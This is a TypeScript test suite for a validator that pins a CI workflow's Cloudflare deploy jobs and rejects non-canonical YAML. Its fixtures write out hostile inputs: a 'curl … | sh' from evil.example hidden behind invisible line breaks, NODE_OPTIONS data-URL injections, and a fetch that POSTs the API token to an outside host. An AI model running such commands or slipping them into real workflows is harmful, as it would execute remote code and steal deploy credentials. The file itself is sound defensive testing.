    // A persistent self-hosted runner keeps the tool cache and home directory that earlier jobs'
    // branch code ran beside.
    expect(block).toContain('\n    runs-on: ubuntu-latest\n');
  });

  test('installs, builds and tests nothing, and runs only the shell it must', () => {
    for (const command of ['npm ci', 'npm install', 'npm i ', 'npm run', 'npm test', 'npx ']) expect(block, command).not.toContain(command);
    const allowed = [TRUSTED_CONFIG, VERSION_CHECK, FLOOR_CHECK, ...(expected.builder ? [ID_CHECK, COPY_SITE] : [COPY_CONFIG])];
    for (const script of runs) expect(allowed.includes(script) || NOTICE.test(script), script).toBe(true);
    for (const script of allowed) expect(runs, script).toContain(script);
  });

  // Ruling 77: an allow-list, where the test below is a deny-list.
  test('has only the job keys and step keys a token job may have', () => {
    expect(problems.keys).toEqual([]);
  });

  test("names secrets only on the HAS_CLOUDFLARE line and in wrangler-action's apiToken and accountId", () => {
    expect(problems.secrets).toEqual([]);
  });

  test('is exactly the pinned job: each step in order, by its action and SHA or its script, and every value but the names', () => {
    expect(problems.shape).toEqual([]);
  });

  test('has no container, services, strategy, shell, working-directory, defaults, outputs or continue-on-error', () => {
    expect(block).not.toMatch(/^\s*(?:- )?(container|services|strategy|shell|working-directory|defaults|outputs|continue-on-error):/m);
  });

  test('uses only pinned actions/* and cloudflare/wrangler-action, with only the inputs they need', () => {
    const uses = [...block.matchAll(/^\s*(?:- )?uses: (.*)$/gm)].map((match) => match[1]!);
    expect(uses.length).toBe(all.filter((step) => stepValue(step, 'uses')).length);
    for (const value of uses) expect(value).toMatch(PIN);
    for (const step of all.filter((step) => stepValue(step, 'uses'))) {
      const allowed = INPUTS[action(step)!];
      expect(allowed, `${action(step)} in a token job`).toBeDefined();
      for (const input of mapping(step, 'with', 8).keys()) expect(allowed, `${action(step)}: ${input}`).toContain(input);
    }
  });

  test('passes no environment but its own flags', () => {
    expect([...mapping(block, 'env', 4).keys()]).toEqual(['HAS_CLOUDFLARE']);
    for (const step of all) for (const key of mapping(step, 'env', 8).keys()) expect(STEP_ENV, key).toContain(key);
  });

  test('runs every step under the same condition, but the skip notice', () => {
    for (const step of all) {
      const script = scalar(step, 'run', 8);
      if (script !== undefined && NOTICE.test(script)) expect(stepValue(step, 'if')).toBe("env.HAS_CLOUDFLARE != 'true'");
      else expect(stepValue(step, 'if'), step.split('\n')[0]).toBe(ENABLED);
    }
  });

  test('checks out only the trusted files, at the trusted ref, into trusted/', () => {
    const checkouts = find('actions/checkout');
    expect(checkouts).toHaveLength(1);
    const inputs = mapping(checkouts[0]!, 'with', 8);
    expect(inputs.get('ref')).toBe(expected.ref);
    expect(inputs.get('path')).toBe('trusted');
    expect(scalar(checkouts[0]!, 'sparse-checkout', 10)?.split('\n')).toEqual(TRUSTED_FILES);
    expect(inputs.get('sparse-checkout-cone-mode')).toBe('false');
    expect(inputs.get('persist-credentials')).toBe('false');
    const setupNode = find('actions/setup-node');
    expect(setupNode).toHaveLength(1);
    expect(mapping(setupNode[0]!, 'with', 8).get('node-version-file')).toBe('trusted/.nvmrc');
    expect(mapping(setupNode[0]!, 'with', 8).get('package-manager-cache')).toBe('false');
  });

  test('refuses a custom build, and stops without a wrangler version, before wrangler runs', () => {
    const trusted = at((step) => scalar(step, 'run', 8) === TRUSTED_CONFIG);
    const check = at((step) => scalar(step, 'run', 8) === VERSION_CHECK);
    expect(trusted).toBeGreaterThan(at((step) => action(step) === 'actions/setup-node'));
    expect(at((step) => action(step) === 'actions/setup-node')).toBeGreaterThan(at((step) => action(step) === 'actions/checkout'));
    expect(stepValue(all[trusted]!, 'id')).toBe('trusted');
    expect(check).toBeGreaterThan(trusted);
    expect(mapping(all[check]!, 'env', 8).get('WRANGLER_VERSION')).toBe('${{ steps.trusted.outputs.wrangler-version }}');
    expect(wranglers.length).toBeGreaterThan(0);
    expect(all.indexOf(wranglers[0]!)).toBeGreaterThan(check);
  });

  test("stops unless the runner's npm knows the release-age floor, before wrangler runs", () => {
    const floor = at((step) => scalar(step, 'run', 8) === FLOOR_CHECK);
    expect(floor).toBeGreaterThan(at((step) => action(step) === 'actions/setup-node'));
    expect(all.indexOf(wranglers[0]!)).toBeGreaterThan(floor);
  });

  test('downloads its artifact by the ID its builder uploaded, and copies only dist/ and bundle/worker.js out of it', () => {
    const downloads = find('actions/download-artifact');
    expect(downloads).toHaveLength(expected.builder ? 1 : 0);
    if (expected.builder) {
      expect(needs(block)).toContain(expected.builder);
      expect(mapping(downloads[0]!, 'with', 8).get('artifact-ids')).toBe(`\${{ needs.${expected.builder}.outputs.site-artifact-id }}`);
      expect(mapping(downloads[0]!, 'with', 8).has('name')).toBe(false);
    }
    const downloadPaths = downloads.map((step) => mapping(step, 'with', 8).get('path') ?? '');
    expect(downloadPaths.every((path) => path.startsWith('${{ runner.temp }}/'))).toBe(true);
    const sources = runs.flatMap((script) => [...script.matchAll(/^cp (?:-R )?(\S+) \S+$/gm)].map((match) => match[1]));
    expect(sources.sort()).toEqual(
      (expected.builder ? ['"$RUNNER_TEMP/artifact/bundle/worker.js"', '"$RUNNER_TEMP/artifact/dist"', 'trusted/wrangler.jsonc'] : ['trusted/wrangler.jsonc']).sort(),
    );
    for (const step of wranglers) {
      const workingDirectory = mapping(step, 'with', 8).get('workingDirectory');
      expect(workingDirectory).toBe(SITE);
      for (const path of downloadPaths) {
        expect(`${workingDirectory}/`.startsWith(`${path}/`), `${workingDirectory} is inside ${path}`).toBe(false);
        expect(`${path}/`.startsWith(`${workingDirectory}/`), `${path} is inside ${workingDirectory}`).toBe(false);
      }
    }
  });

  test('stops unless the artifact ID is one number, before it downloads with a download-artifact that fails on a digest mismatch', () => {
    const check = at((step) => scalar(step, 'run', 8) === ID_CHECK);
    for (const download of find('actions/download-artifact')) {
      expect(check).toBeGreaterThan(-1);
      expect(mapping(all[check]!, 'env', 8).get('ARTIFACT_ID')).toBe(mapping(download, 'with', 8).get('artifact-ids'));
      expect(all.indexOf(download)).toBeGreaterThan(check);
      expect(Number(/ # v(\d+)\./.exec(stepValue(download, 'uses') ?? '')?.[1])).toBeGreaterThanOrEqual(DOWNLOAD_MAJOR);
    }
  });

  test('runs its one wrangler command, at the trusted version, with no install scripts and a release-age floor', () => {
    expect(wranglers).toHaveLength(1);
    const inputs = mapping(wranglers[0]!, 'with', 8);
    expect(inputs.get('command')).toBe(expected.command);
    expect(inputs.get('wranglerVersion')).toBe('${{ steps.trusted.outputs.wrangler-version }}');
    expect(inputs.get('apiToken')).toBe('${{ secrets.CLOUDFLARE_API_TOKEN }}');
    expect(inputs.get('accountId')).toBe('${{ secrets.CLOUDFLARE_ACCOUNT_ID }}');
    const env = mapping(wranglers[0]!, 'env', 8);
    expect(env.get('npm_config_ignore_scripts')).toBe("'true'");
    // The same floor as Dependabot's cooldown, for the ~35 packages wrangler-action installs
    // with no lockfile.
    expect(COOLDOWN_DAYS.length).toBeGreaterThan(0);
    for (const days of COOLDOWN_DAYS) expect(env.get('npm_config_min_release_age')).toBe(`'${days}'`);
  });
});

test.each(['ci.yml:preview-build', 'ci.yml:preview', 'ci.yml:preview-cleanup'])(
  '%s runs only when CI_PREVIEWS is true, for a pull request into the default branch',
  (name) => {
    const gate = condition(job(name));
    expect(gate).toContain("vars.CI_PREVIEWS == 'true'");
    expect(gate).toContain('github.event.pull_request.base.ref == github.event.repository.default_branch');
  },
);

// The canonical reader itself, on the spellings that would otherwise slip past the line-based checks.
describe('the canonical reader', () => {
  const errors = (text: string) => readCanonical('t.yml', text).errors;
  // Each tail below lands in step y, at eight spaces, among keys that step doesn't have yet.
  const ok =
    'name: t\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - name: x\n        run: |\n          # a shell comment\n          echo "${{ github.sha }}"\n        env:\n          A: \'b\'\n      - name: y\n';
  const NOT_A_KEY = 'not a bare `key:` or `key: value`';
  const NOT_A_VALUE = 'in place of a value';
  const MAPPING = 'must be a mapping on the lines below';
  const outside = (codePoint: string) => `${codePoint}, but a workflow holds only printable ASCII and LF`;
  // the reviewer's M1 (as CR, NEL, LS and PS), M2, M3 and N1: a YAML line break that a split on LF never sees
  const hidden = (lineBreak: string) => `        with:\n          apiToken: x\n          # note${lineBreak}          preCommands: curl -s https://evil.example | sh\n`;

  test('accepts the canonical form', () => expect(errors(ok)).toEqual([]));

  test.each([
    ['a space before the colon', ok + '        env:\n          NODE_OPTIONS : x\n', NOT_A_KEY],
    ['a quoted key', ok + '        env:\n          "NODE_OPTIONS": x\n', NOT_A_KEY],
    ['a tag on a key', ok + '        env:\n          !!str NODE_OPTIONS: x\n', NOT_A_KEY],
    ['a complex key', ok + '        with:\n          ? preCommands\n          : curl x | sh\n', NOT_A_KEY],
    ['a tagged mapping', ok + '        env: !!map\n          NODE_OPTIONS: x\n', NOT_A_VALUE],
    ['an anchor', ok + '        env: &e\n          A: b\n', NOT_A_VALUE],
    ['an alias', ok + '        env: *e\n', NOT_A_VALUE],
    ['a flow mapping', ok + '        env: { NODE_OPTIONS: x }\n', NOT_A_VALUE],
    ['an empty flow mapping', ok + '        env: {}\n', NOT_A_VALUE],
    ['a flow sequence', ok + '        needs: [a, b]\n', NOT_A_VALUE],
    ['an escape in a double-quoted value', ok + '        env:\n          X: "${{ \\x73ecrets.T }}"\n', 'a double-quoted value with a backslash'],
    ['a commented block key', ok + '        with: # note\n          preCommands: x\n', NOT_A_VALUE],
    ['a nested block indented four spaces', ok + '        with:\n            preCommands: x\n', 'a nested block not indented two spaces'],
    ['a second with in one step', ok + '        with:\n          a: b\n        with:\n          preCommands: x\n', 'a second "with" in one mapping'],
    ['a plain value carried onto a second line', ok + '        run: echo a\n          b\n', 'an indentation that matches no open block'],
    ['an indentless sequence', ok + '        needs:\n        - a\n', 'a sequence item among keys'],
    ['a block-scalar indentation indicator', ok + '        run: |2\n            echo a\n', NOT_A_VALUE],
    // Ruling 67: printable ASCII and LF only, comments and block scalars included.
    ['M1: a CR in a comment, hiding preCommands', ok + hidden('\r'), outside('U+000D (CR)')],
    ['M1: a NEL in a comment, hiding preCommands', ok + hidden('\u0085'), outside('U+0085 (NEL)')],
    ['M1: an LS in a comment, hiding preCommands', ok + hidden('\u2028'), outside('U+2028 (LS)')],
    ['M1: a PS in a comment, hiding preCommands', ok + hidden('\u2029'), outside('U+2029 (PS)')],
    ['M2: a CR in a top-level comment, hiding an env', 'name: t\n# note\renv:\r  NODE_OPTIONS: --import=data:text/javascript,0\n' + ok.slice('name: t\n'.length), outside('U+000D (CR)')],
    ['M3: a CR in a job comment, hiding a secret', ok.replace('  a:\n', '  a:\n    # note\r    env:\r      LEAK: ${{ secrets.T }}\n'), outside('U+000D (CR)')],
    ['N1: a NEL in a step name, hiding an env', ok.replace('      - name: y\n', '      - name: y\u0085        env:\u0085          NODE_OPTIONS: --import=data:text/javascript,0\n'), outside('U+0085 (NEL)')],
    ['a byte-order mark', '\uFEFF' + ok, outside('U+FEFF (BOM)')],
    ['NBSP indentation', ok + '        env:\n' + '\u00A0'.repeat(10) + 'A: b\n', outside('U+00A0 (NBSP)')],
    ['a tab for indentation', ok + '        env:\n\t  A: b\n', outside('U+0009 (tab)')],
    ['a tab in a block scalar', ok + '        run: |\n          echo a\tb\n', outside('U+0009 (tab)')],
    ['a CRLF file', ok.replaceAll('\n', '\r\n'), outside('U+000D (CR)')],
    // Ruling 68: a key that holds a mapping holds nothing else on its own line.
    ['M5: an env written as one expression', ok + `        env: \${{ fromJSON('{"NODE_OPTIONS":"--import=data:text/javascript,0"}') }}\n`, MAPPING],
    ['a with written as one expression', ok + "        with: ${{ fromJSON('{\"preCommands\":\"curl x | sh\"}') }}\n", MAPPING],
    ['secrets: inherit', ok + '        secrets: inherit\n', MAPPING],
    ['permissions: write-all', 'permissions: write-all\n' + ok, MAPPING],
    ['a block scalar for env', ok + '        env: |\n          A=b\n', MAPPING],
  ])('refuses %s', (_name, text, why) => expect(errors(text).join('\n')).toContain(why));

  test.each(['env', 'with', 'secrets', 'outputs', 'services', 'container', 'strategy', 'defaults', 'inputs', 'permissions'])(
    'refuses %s with a value on its own line',
    (key) => expect(errors(`${ok}        ${key}: \${{ fromJSON('{}') }}\n`).join('\n')).toContain(`"${key}" ${MAPPING}`),
  );
});

// The pin, on the final review's mutations of ci.yml. Each is in the canonical subset, and each
// passed every test before Ruling 77.
describe('the token-job pin', () => {
  const ci = WORKFLOWS.get('ci.yml')!;
  /** ci.yml with `old` replaced in one job's block, where it must occur exactly once. */
  const inJob = (text: string, job: string, old: string, replacement: string) => {
    const start = text.indexOf(`\n  ${job}:\n`);
    const end = start + 2 + text.slice(start + 2).search(/\n {2}\S/);
    const block = text.slice(start, end);
    expect(block.split(old), `${job}: ${old}`).toHaveLength(2);
    return text.slice(0, start) + block.replace(old, () => replacement) + text.slice(end);
  };
  const problemsOf = (text: string, name: keyof typeof TOKEN_JOBS) => {
    expect(readCanonical('ci.yml', text).errors).toEqual([]);
    return tokenJobProblems(name, jobBlocks('ci.yml', text).get(name.slice('ci.yml:'.length)) ?? '');
  };
  const TRUSTED_STEP = `        id: trusted\n        if: ${ENABLED}\n`;
  const VERSION_STEP = `      - name: Stop unless a wrangler version was read\n        if: ${ENABLED}\n`;
  const WRANGLER = `      - if: ${ENABLED}\n        uses: cloudflare/wrangler-action@`;

  test('passes ci.yml as it is', () => {
    for (const name of Object.keys(TOKEN_JOBS) as (keyof typeof TOKEN_JOBS)[]) expect(problemsOf(ci, name), name).toEqual({ keys: [], secrets: [], shape: [] });
  });

  // (a) GitHub has run background steps since 2026-06-25: the job moves on without waiting, so the
  // "Stop unless" guards no longer stand before wrangler.
  test("refuses (a): background: true on deploy's trusted-config and version-check steps", () => {
    let text = inJob(ci, 'deploy', TRUSTED_STEP, `${TRUSTED_STEP}        background: true\n`);
    text = inJob(text, 'deploy', VERSION_STEP, `${VERSION_STEP}        background: true\n`);
    const { keys, shape } = problemsOf(text, 'ci.yml:deploy');
    expect(keys).toEqual(['step 4: "background" is not a key a token job\'s step may have', 'step 5: "background" is not a key a token job\'s step may have']);
    expect(shape.join('\n')).toContain('step 4: ');
  });

  test('refuses (b): a github-script step in deploy that posts the token to another host', () => {
    const step = [
      '      - name: Report the deploy',
      `        if: ${ENABLED}`,
      `        uses: ${TOKEN_ACTIONS.githubScript} # v9.0.0`,
      '        with:',
      '          script: |',
      "            await fetch('https://collector.example.net/', { method: 'POST', body: '${{ secrets.CLOUDFLARE_API_TOKEN }}' });",
      '',
    ].join('\n');
    const { secrets, shape } = problemsOf(inJob(ci, 'deploy', WRANGLER, step + WRANGLER), 'ci.yml:deploy');
    expect(secrets).toEqual(['step 10: with.script names secrets']);
    expect(shape).toContain('11 steps, but the pin has 10');
  });

  test('refuses (c): PREVIEW_URL set to the token, which the comment step would post on the pull request', () => {
    const { secrets, shape } = problemsOf(
      inJob(ci, 'preview', 'PREVIEW_URL: ${{ steps.preview.outputs.preview-url }}', 'PREVIEW_URL: ${{ secrets.CLOUDFLARE_API_TOKEN }}'),
      'ci.yml:preview',
    );
    expect(secrets).toEqual(['step 11: env.PREVIEW_URL names secrets']);
    expect(shape.join('\n')).toContain('step 11: ');
  });
});
